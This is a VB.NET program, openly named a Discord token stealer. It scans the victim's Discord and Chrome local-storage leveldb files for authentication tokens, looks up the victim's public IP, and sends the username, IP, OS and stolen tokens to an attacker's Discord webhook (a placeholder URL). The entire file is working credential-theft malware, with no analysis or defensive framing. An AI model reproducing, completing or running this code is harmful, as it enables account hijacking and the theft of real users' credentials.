Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Text

Namespace Discord_Token_Stealer
	Friend NotInheritable Class Program

		Private Sub New()
		End Sub

		Shared Sub Main()
'			#Region "grabbing token"
			Dim string1 As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\discord\Local Storage\leveldb\"
			If (Not dotldb(string1)) AndAlso (Not dotldb(string1)) Then
			End If
			System.Threading.Thread.Sleep(100)
			Dim string2 As String = tokenx(string1, string1.EndsWith(".log"))
			If string2 = "" Then
				string2 = "N/A"
			End If

			Dim string3 As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\Google\Chrome\User Data\Default\Local Storage\leveldb\"
			If (Not dotldb(string3)) AndAlso (Not dotlog(string3)) Then
			End If
			System.Threading.Thread.Sleep(100)
			Dim string4 As String = tokenx(string3, string3.EndsWith(".log"))
			If string4 = "" Then
				string4 = "N/A"
			End If
'			#End Region

			'sending message to discord webhook
			Using dcWeb As New DcWebHook()
				Dim mos As New ManagementObjectSearcher("select * from Win32_OperatingSystem")
				For Each managementObject As ManagementObject In mos.Get()
					Dim OSName As String = managementObject("Caption").ToString()
					dcWeb.ProfilePicture = "https://رابط-الصوره-للويبهوكYOURimageLink.com"
					dcWeb.UserName = "Tocken"
					dcWeb.WebHook = "https://WEBHOCK-LICK-رابط-الويب-هوك"
					dcWeb.SendMessage("```" & "UserName: " & Environment.UserName & Environment.NewLine & "IP: " & GetIPAddress() & Environment.NewLine & "OS: " & OSName & Environment.NewLine & "Token DiscordAPP: " & string2 & Environment.NewLine & "Token Chrome: " & string4 & "```")
				Next managementObject
			End Using
		End Sub

		#Region "grabbingIP"
		Public Shared Function GetIPAddress() As String
			Dim IPADDRESS As String = (New WebClient()).DownloadString("http://ipv4bot.whatismyipaddress.com/") 'TO GET THE IP4 FROM VICTM لجلب ايبي الضحيه
			Return IPADDRESS
		End Function
		#End Region

		#Region "stealingtoken"
		Private Shared Function dotlog(ByRef stringx As String) As Boolean
			If Directory.Exists(stringx) Then
				For Each fileInfo As FileInfo In (New DirectoryInfo(stringx)).GetFiles()
					If fileInfo.Name.EndsWith(".log") AndAlso File.ReadAllText(fileInfo.FullName).Contains("oken") Then
						stringx &= fileInfo.Name
						Return stringx.EndsWith(".log")
					End If
				Next fileInfo
				Return stringx.EndsWith(".log")
			End If
			Return False
		End Function
		Private Shared Function tokenx(ByVal stringx As String, Optional ByVal boolx As Boolean = False) As String
			Dim bytes() As Byte = File.ReadAllBytes(stringx)
			Dim [string] As String = Encoding.UTF8.GetString(bytes)
			Dim string1 As String = ""
			Dim string2 As String = [string]
			Do While string2.Contains("oken")
				Dim array() As String = IndexOf(string2).Split(New Char() { """"c })
				string1 = array(0)
				string2 = String.Join("""", array)
				If boolx AndAlso string1.Length = 59 Then
					Exit Do
				End If
			Loop
			Return string1
		End Function
		Private Shared Function dotldb(ByRef stringx As String) As Boolean
			If Directory.Exists(stringx) Then
				For Each fileInfo As FileInfo In (New DirectoryInfo(stringx)).GetFiles()
					If fileInfo.Name.EndsWith(".ldb") AndAlso File.ReadAllText(fileInfo.FullName).Contains("oken") Then
						stringx &= fileInfo.Name
						Return stringx.EndsWith(".ldb")
					End If
				Next fileInfo
				Return stringx.EndsWith(".ldb")
			End If
			Return False
		End Function
		Private Shared Function IndexOf(ByVal stringx As String) As String
			Dim array() As String = stringx.Substring(stringx.IndexOf("oken") + 4).Split(New Char() { """"c })
			Dim list As New List(Of String)()
			list.AddRange(array)
			list.RemoveAt(0)
			array = list.ToArray()
			Return String.Join("""", array)
		End Function
		#End Region
	End Class
End Namespace
